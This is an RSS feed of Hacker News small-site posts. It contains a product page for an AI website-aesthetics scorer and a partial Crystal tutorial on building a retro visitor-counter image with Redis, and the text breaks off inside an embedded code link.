<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 20 Sep 2020 16:24:25 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 20 Sep 2020 16:24:25 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Show HN: How beautiful is your website – check using Visual Mind AI]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525995">thread link</a>) | @myraahio
<br/>
September 19, 2020 | https://myraah.io/visualmind | <a href="https://web.archive.org/web/*/https://myraah.io/visualmind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              
              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website’s appeal within a split second.  This first impression is influential enough to later affect their opinions of a site’s usability and trustworthiness.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind ?</h4>
              <p>Visual Mind is an AI engine specifically designed for understanding and scoring visual appearance of a website. Visual Mind has analyzed over a million websites to achieve an accuracy rate of over 97%.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you “fast-tested” your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score – provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>
              <p><a href="https://myraah.io/index.php/visualmind">Check Your VM SCORE</a></p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
				<h4>Want to explore more – we recommend</h4>
              <p>A.  Bauerly, M., and Liu, Y. Effects of Symmetry and Number of Compositional Elements on Interface and Design Aesthetics. Int. Journal of Human-Computer Interaction 3 (2008).</p>
              <p>B. Cyr, D. Modeling Website Design across Cultures: Relationships to Trust, Satisfaction and E-loyalty. Journal of Management Information Systems 24, 4 (2008)</p>
              <p>C. Everard, A., and Galletta, D. How presentation flaws affect perceived site quality, trust, and intention to purchase from an online store. Journal of Management Information Systems 22, 3 (2006)</p>
              <p>D. Geissler, G., Zinkhan, G., and Watson, R. The Influence of Home Page Complexity on Consumer Attention, Attitudes, and Purchase Intent. Journal of Advertising 35, 2 (2006)</p>
              <p>E. Hall, R. H., and Hanna, P. The Impact of Web Page Text-background Colour Combinations on Readability,Retention, Aesthetics and Behavioural Intention. Behaviour &amp; Information Technology 23, 3 (2004)</p>
              <p>G. Lindgaard, G., Fernandes, G., Dudek, C., and Brown, J. Attention Web Designers: You Have 50 Milliseconds to Make a Good First Impression! Behaviour &amp; Information Technology 25, 2 (2006)</p>
              <p>H. Michailidou, E., Harper, S., and Bechhofer, S. Visual Complexity and Aesthetic Perception of Web Pages. Proc. Design of Communication (2008)</p>
              <p>I. Tuch, A. N., Bargas-Avila, J. A., and Opwis, K. Symmetry and Aesthetics in Website Design: It’s a Man’s Business. Computers in Human Behavior 26, 6 (2010)</p>
              
			</div>
          </div> <!-- col -->
        </div></div>]]>
            </description>
            <link>https://myraah.io/visualmind</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525995</guid>
            <pubDate>Sat, 19 Sep 2020 08:13:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CrazyFast Crystal based 88x31 visitor counter img generator brought back to 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525873">thread link</a>) | @gcds
<br/>
September 19, 2020 | https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: A Crystal based super fast visitor counter">
            </figure>

            <section>
                <div>
                    <p>I have taken this week's holidays with the plan that the Overkill Workbench materials would be delivered today, but in the end, it will be delivered on Sunday, so I have a lot of free time on my hands.</p><p>Yesterday, while talking with some friends, I remembered old good &lt;2008 websites, portals, and how we created them; one of the most prominent features I loved about that period was 88x31, and 120x60 sized Ad's/Counters and other goodies. It was always a fight between website authors fighting for a higher number of page visits and similar metrics. Nowadays, everything is hidden and typical, only seen by webmasters on Google Analytics and similar tools.</p><p>So today's my evening project is <a href="https://crystal-lang.org/">Crystal</a> language-based 88x31 website visitor counter image rendered entirely in <a href="https://crystal-lang.org/">Crystal</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-60.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-60.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-60.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-60.png 1600w, https://www.techprowd.com/content/images/2020/09/image-60.png 1754w" sizes="(min-width: 720px) 720px"></figure><h2 id="requirements-">Requirements:</h2><ul><li>A single endpoint would return 88x31 sized png with numbers</li><li>Provide two numbers, one unique visitor count, and other total visits.</li><li>Do not depend on external libraries for image generation.</li><li>Use the least amount of resources like memory and disk space. (Maybe one day my blog will be viral, who knows)</li><li>Most important, be as fast as possible!</li></ul><h2 id="architecture-">Architecture:</h2><p>The plan is to run the crystal internal HTTP server without any overhangs and host it on Heroku free plan.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-61.png" alt=""></figure><p>Store user identifiers in Redis for uniqueness measurement and fast lookup (Remember we need speed)</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source.gif" alt=""></figure><p>I found a shard (Crystal libraries are called shards) for image rendering, which can generate a PNG image using raw X, Y pixel information no external libraries used.</p><figure><a href="https://github.com/stumpycr/stumpy_png"><div><p>stumpycr/stumpy_png</p><p>Read/Write PNG images in pure Crystal. Contribute to stumpycr/stumpy_png development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/27729351?s=400&amp;v=4"></p></a></figure><p>For Redis client, I am going to use this shard:</p><figure><a href="https://github.com/stefanwille/crystal-redis"><div><p>stefanwille/crystal-redis</p><p>Full featured Redis client for Crystal. Contribute to stefanwille/crystal-redis development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>stefanwille</span><span>GitHub</span></p></div><p><img src="https://avatars2.githubusercontent.com/u/331756?s=400&amp;v=4"></p></a></figure><h2 id="step-1-rendering-image">Step 1: Rendering image</h2><p>As I have chosen image size to be 88x31, I need to try to fit two numbers. Total visits - Every load counts and Unique Visitors - Number of unique visitors.</p><p>I have drawn some sample representation I imagine in Photoshop:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-62.png" alt=""></figure><p>It looks tiny on my 4K monitor, but back in 2005, it looked huge on my 1024x768 monitor.</p><p>One of the problems now that I am not using external libraries is that I have no simple way to render text on the image. That's not a big deal, remembering practices I used for Graphical LCD/OLED on embedded electronic projects. I will create an array of Tuples of 3 uint8 integers of each pixel information in a 7x10 array for each number.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-64.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-64.png 600w, https://www.techprowd.com/content/images/2020/09/image-64.png 800w" sizes="(min-width: 720px) 720px"></figure><p>To make each number in array format, I need to generate 7x10 images of each number. Then using the <a href="https://javl.github.io/image2cpp/">https://javl.github.io/image2cpp/</a> tool, I generated arrays for each character.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x404141%252C%25200xa4a4a4%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xababab%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x212222%252C%25200xababab%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x646465%252C%25200xb3b3b3%252C%25200x939393%252C%25200xababab%252C%25200x828282%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x212222%252C%25200x4d4e4e%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D"><img src="https://www.techprowd.com/content/images/2020/09/carbon--19-.png" alt="carbon--19-"></a></p>
<!--kg-card-end: markdown--><p>Now that I have pixel data of each character, I can finally create a whole image.</p><p>Knowing the array's exact size, in our case, it's 7x10; we can loop through the array and fill in all pixels referenced from a given position.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%253A%253ACharacters%250A%2520%2520%2520%2520CHARACTER_WIDTH%2520%253D%25207%250A%2520%2520%2520%2520CHARACTER_HEIGHT%2520%253D%252010%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520TWO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x828282%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200xababab%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x646465%252C%25200x939393%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x8b8b8b%252C%25200x787879%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x404141%252C%25200x939393%252C%25200x404141%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--20-.png" alt="carbon--20-"></a></p>
<!--kg-card-end: markdown--><p>After trying out <code>VisitorCounter::Characters.render_character</code> function I was able to see it working correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-65.png" alt=""></figure><p>Now it's time to wrap it all and make the main function, which would generate and return generated image as <code>IO::Memory</code> buffer.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/carbon--21--1.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/carbon--21--1.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/carbon--21--1.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/carbon--21--1.png 1600w, https://www.techprowd.com/content/images/2020/09/carbon--21--1.png 2048w" sizes="(min-width: 720px) 720px"></figure><p>To make more usable, I added this image generator to a simple HTTP server and returned random numbers generated in response.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Ainclude%2520StumpyPNG%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Aserver%2520%253D%2520HTTP%253A%253AServer.new%2520do%2520%257Ccontext%257C%250A%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%250A%2520%2520image%2520%253D%2520VisitorCounter%253A%253AImageGenerator.generate(%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520)%250A%250A%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520IO.copy(image%252C%2520context.response)%250Aend%250A%250Aaddress%2520%253D%2520server.bind_tcp%25208080%250Aputs%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250Aserver.listen%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--22-.png" alt="carbon--22-"></a></p>
<!--kg-card-end: markdown--><p>After running this code and going to <code>http://127.0.0.1:8080</code> I received generated image with random numbers.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-66.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-66.png 600w, https://www.techprowd.com/content/images/2020/09/image-66.png 612w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-67.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-67.png 600w, https://www.techprowd.com/content/images/2020/09/image-67.png 612w"></figure><p>Now we can move on to a more exciting part, which is counting visitors.</p><h2 id="step-2-counting-visitors">Step 2: Counting Visitors</h2><p>To count visitors first, we need some kind of unique value. In this project, I am going to use the IP address of the client. As I plan to host this on Heroku, I know that IP will only be IPv4, so I can safely convert the IP address from 127.0.0.1 to its bytes equivalent by merging all 4 x Int8 parts of IP this way it will take less space in Redis memory 4 bytes instead of 15 bytes.</p><p>This is a function which extracts IP address from request. As I mentioned before, this will be hosted on Heroku, so the client IP address will be available in the HTTP header <code>X-Forwarded-For</code> as a load balancer will replace the client IP address with its own.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520extract_ip(request)%250A%2520%2520%2520%2520ip%2520%253D%2520request.headers%255B%2522X-Forwarded-For%2522%255D%253F%250A%2520%2520%2520%2520if%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520case%2520remote_address%2520%253D%2520request.remote_address%250A%2520%2520%2520%2520%2520%2520%2520%2520when%2520Socket%253A%253AIPAddress%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520remote_address.address%250A%2520%2520%2520%2520%2520%2520%2520%2520else%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520nil%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520unless%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520a%252C%2520b%252C%2520c%252C%2520d%2520%253D%2520ip.split(%27.%27)%250A%250A%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520Slice(UInt8).new(4)%250A%2520%2520%2520%2520%2520%2520ip_address%255B0%255D%2520%253D%2520a.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B1%255D%2520%253D%2520b.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B2%255D%2520%253D%2520c.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B3%255D%2520%253D%2520d.to_u8%250A%250A%2520%2520%2520%2520%2520%2520return%2520String.new(ip_address)%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520nil%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--25-.png" alt="carbon--25-"></a></p>
<!--kg-card-end: markdown--><p>If the IP address is not available for some reason, I will skip this visit from a unique visit count and just increase the total visit count.</p><p>Now wrapping everything into <code>WebHandler</code>, which will nicely integrate into HTTP Server, we should have a working counter.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%250A%2520%2520%2520%2520class%2520WebHandler%250A%2520%2520%2520%2520%2520%2520%2520%2520include%2520HTTP%253A%253AHandler%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_OFFSET_KEY%2520%253D%2520%2522UNIQUE_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_OFFSET_KEY%2520%253D%2520%2522TOTAL_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_KEY%2520%253D%2520%2522TOTAL_VISITS%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_KEY%2520%253D%2520%2522UNIQUE_VISITS%2522%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520initialize(redis%2520%253A%2520Redis%253A%253APooledClient)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis%2520%253D%2520redis%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520call(context)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers%255B%2522Server%2522%255D%2520%253D%2520%2522Techprowd%2520Visitor%2520Counter%2520v1.0%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520context.request.method%2520%253D%253D%2520%2522GET%2522%2520%257C%257C%2520context.request.method%2520%253D%253D%2520%2522HEAD%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.status_code%2520%253D%2520405%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers.add(%2522Allow%2522%252C%2520%2522GET%252C%2520HEAD%2522)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%